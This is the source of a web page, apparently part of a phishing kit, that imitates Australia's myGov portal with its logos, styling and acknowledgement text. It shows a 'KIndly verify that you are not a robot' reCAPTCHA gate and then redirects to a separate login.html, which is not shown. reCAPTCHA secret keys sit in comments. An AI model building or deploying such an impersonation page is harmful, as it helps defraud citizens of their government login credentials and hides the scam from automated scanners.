<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>Verify</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="format-detection" content="telephone=no">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
	<link href="css/mgv2-application.css" rel="stylesheet">
	<link href="css/blugov.css" rel="stylesheet">
</head>
<body>
<?php
// // Get a key from http://recaptcha.net/api/getkey
// $publickey = "6Lf9z-EkAAAAAH6RDqWwI9bEw7wcwxyi8_jV0_Ys";
// $privatekey = "6Lf9z-EkAAAAAG_Vkc9-GNO9qUyUB_ydVMHTvE9L";
?>
    <div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                    </a>
				</div>
			</div>
		</div>
	</section>
</header>
<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	<div class="unauth">
		<div class="login-grid-container">
			<div class="login-grid-row">
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
							<h2 class="text-align-left">KIndly verify that you are not a robot</h2>
                            
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<form action="" method="POST">
<?php
 if(isset($_POST['submit']) && $_POST['submit'] == 'SUBMIT'){
  if(isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response']))
  {
        $secret = '6LfwGpIUAAAAANKk4huBMAbqP3hKzknxOj2wo6Qs';
        $verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secret.'&response='.$_POST['g-recaptcha-response']);
        $responseData = json_decode($verifyResponse);
        if($responseData->success)
        { 
        
        ?>
<div style="color: limegreen;"><b>successfully.</b></div>
        <?php 
        header("location: login.html");
        }
        else
        {?>
            <div style="color: red;"><b>Robot verification failed, please try again.</b></div>
        <?php }
   }else{?>
       <div style="color: red;"><b>Please do the robot verification.</b></div>
   <?php }
 }
?>

    <div class="g-recaptcha" data-sitekey="6LfwGpIUAAAAAB_BNNxwXpr7MunyPbG2izN6WOLE"></div><br><br>
    <input type="submit" name="submit" value="SUBMIT">
</form>

                        </div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div></div>
<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank">Terms of use</a>
                </li>
                <li>
                    <a target="_blank">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank">Copyright</a>
                </li>
                <li>
                    <a target="_blank">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a>
                  <img src="images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
          </div>




      </div>
    </div>
  </footer>



</body></html>




<!-- 

SITE KEY: 6Lf9z-EkAAAAAH6RDqWwI9bEw7wcwxyi8_jV0_Ys

SECRETE KEY: 6Lf9z-EkAAAAAG_Vkc9-GNO9qUyUB_ydVMHTvE9L 


 -->
